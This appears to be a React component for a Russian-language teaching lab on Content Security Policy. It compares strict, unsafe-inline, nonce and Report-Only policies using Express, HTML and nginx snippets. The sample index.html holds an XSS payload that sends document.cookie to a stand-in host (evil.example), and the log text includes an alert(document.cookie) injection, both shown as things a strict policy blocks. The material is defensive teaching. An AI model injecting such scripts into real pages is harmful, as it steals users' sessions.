import { useState } from 'react'
import { JsLabShell } from '../../components/lab/JsLabShell'
import { LabButton } from '../../components/lab/LabButton'
import shell from '../../components/lab/JsLabShell.module.css'
import { InteractiveCodePanel } from '../../components/lab/InteractiveCodePanel'
import { LabLogView } from '../../components/lab/LabLogView'
import { useLabLog } from '../../components/lab/useLabLog'

const TOPIC_ID = '10-csp'

type Scenario = 'strict' | 'unsafe' | 'nonce' | 'report'

export function CspLab() {
  const { lines, log, clear } = useLabLog()
  const [scenario, setScenario] = useState<Scenario>('strict')
  const [hint, setHint] = useState<string | null>(null)

  const run = () => {
    clear()

    if (scenario === 'strict') {
      log('info', "CSP: script-src 'self'; object-src 'none'")
      log('warn', 'в HTML вставлен <script>alert(document.cookie)</script> (XSS)')
      log('ok', 'браузер блокирует inline-скрипт — нет unsafe-inline / nonce')
      log('ok', 'сессия не уехала к атакующему')
      setHint('строгий script-src режет классический XSS')
      return
    }

    if (scenario === 'unsafe') {
      log('info', "CSP: script-src 'self' 'unsafe-inline'")
      log('err', 'тот же XSS-инжект выполняется')
      log('err', "'unsafe-inline' почти обнуляет защиту script-src")
      log('warn', 'eval тоже часто тащат через unsafe-eval — ещё хуже')
      setHint("не держать 'unsafe-inline' в prod")
      return
    }

    if (scenario === 'nonce') {
      log('info', "CSP: script-src 'nonce-a8f3' 'self'")
      log('ok', '<script nonce="a8f3">boot()</script> — совпал nonce, ок')
      log('ok', 'инжект без nonce — заблокирован')
      log('warn', 'nonce должен быть случайным на каждый ответ')
      setHint('nonce/hash вместо unsafe-inline')
      return
    }

    log('info', 'Content-Security-Policy-Report-Only: script-src \'self\'')
    log('warn', 'нарушение: inline / чужой CDN — скрипт всё ещё выполняется')
    log('ok', 'браузер шлёт report на report-to / report-uri')
    log('ok', 'после чистки легитимных источников → enforce')
    setHint('сначала Report-Only, потом жёсткий CSP')
  }

  const problem = (
    <div className={shell.panel}>
      <p className={shell.pain}>
        XSS вставляет скрипт в страницу. Строгий <code>Content-Security-Policy</code> не даёт ему
        выполниться; <code>unsafe-inline</code> снова открывает дыру, nonce — рабочий компромисс для
        нужных inline.
      </p>
      <ol className={shell.steps}>
        <li>Выберите сценарий: strict, unsafe-inline, nonce, Report-Only.</li>
        <li>Прогоните и сравните блокировку vs отчёт.</li>
        <li>
          В «Код»: <code>server.js</code>, <code>index.html</code>, <code>nginx.conf</code>.
        </li>
      </ol>

      <div className={shell.row}>
        {(
          [
            ['strict', 'Strict'],
            ['unsafe', 'unsafe-inline'],
            ['nonce', 'Nonce'],
            ['report', 'Report-Only'],
          ] as const
        ).map(([id, label]) => (
          <LabButton
            key={id}
            variant="ghost"
            size="sm"
            active={scenario === id}
            onClick={() => setScenario(id)}
          >
            {label}
          </LabButton>
        ))}
      </div>

      <div className={shell.row}>
        <LabButton variant="primary" onClick={run}>
          Прогнать
        </LabButton>
        <LabButton
          variant="secondary"
          onClick={() => {
            clear()
            setHint(null)
            setScenario('strict')
          }}
        >
          Сброс
        </LabButton>
      </div>

      {hint ? (
        <p className={shell.hint}>
          Итог: <code>{hint}</code>
        </p>
      ) : (
        <p className={shell.hint}>Выберите сценарий.</p>
      )}
      <LabLogView lines={lines} />
    </div>
  )

  const code = (
    <InteractiveCodePanel
      topicId={TOPIC_ID}
      intro="CSP на ответе документа: директивы, nonce и путь Report-Only → enforce."
      snippets={[
        {
          id: 'server',
          label: 'server.js',
          note: 'Express: уникальный nonce на ответ; без unsafe-inline.',
          executable: false,
          code: `import express from 'express';
import crypto from 'node:crypto';

const app = express();

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64'); // ← на каждый ответ
  res.locals.nonce = nonce;

  // ═══════════════════════════════════════════
  // CSP ← whitelist; XSS без nonce не выполнится
  // ═══════════════════════════════════════════
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      \`script-src 'nonce-\${nonce}' 'self'\`, // ← не 'unsafe-inline'
      "style-src 'self'",
      "object-src 'none'",
      "base-uri 'self'",
      "frame-ancestors 'none'", // ← только HTTP, не meta
    ].join('; '),
  );

  next();
});

app.get('/', (req, res) => {
  const { nonce } = res.locals;
  res.type('html').send(\`<!DOCTYPE html>
<html>
  <head>
    <script nonce="\${nonce}">window.__BOOT__ = { ok: true };</script>
  </head>
  <body>
    <div id="root"></div>
    <script src="/app.js" nonce="\${nonce}"></script>
  </body>
</html>\`);
});

app.listen(3000);`,
        },
        {
          id: 'html',
          label: 'index.html',
          note: 'Инжект без nonce vs легитимный boot с nonce.',
          executable: false,
          code: `<!DOCTYPE html>
<html>
  <head>
    <!-- ═══════════════════════════════════════════
         LEGIT ← nonce совпал с CSP script-src
         ═══════════════════════════════════════════ -->
    <script nonce="a8f3K…">window.__BOOT__ = { userId: 42 };</script>
  </head>
  <body>
    <div id="comments">
      <!-- ═══════════════════════════════════════════
           XSS ← нет nonce → браузер блокирует при строгом CSP
           ═══════════════════════════════════════════ -->
      <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
    </div>
    <script src="/app.js" nonce="a8f3K…"></script>
  </body>
</html>`,
        },
        {
          id: 'nginx',
          label: 'nginx.conf',
          note: 'Сначала Report-Only на edge, потом тот же набор в enforce.',
          executable: false,
          code: `server {
  listen 443 ssl;
  server_name app.example;

  # ═══════════════════════════════════════════
  # Report-Only ← не блокирует; собирает нарушения
  # ═══════════════════════════════════════════
  add_header Content-Security-Policy-Report-Only
    "default-src 'self'; script-src 'self'; report-to csp-endpoint"
    always; # ←

  # После чистки логов — заменить на Content-Security-Policy (enforce)

  location / {
    proxy_pass http://app:3000;
  }
}`,
        },
      ]}
    />
  )

  return (
    <JsLabShell
      title="CSP"
      lead="Strict policy, цена unsafe-inline, nonce и Report-Only перед enforce."
      problem={problem}
      code={code}
    />
  )
}
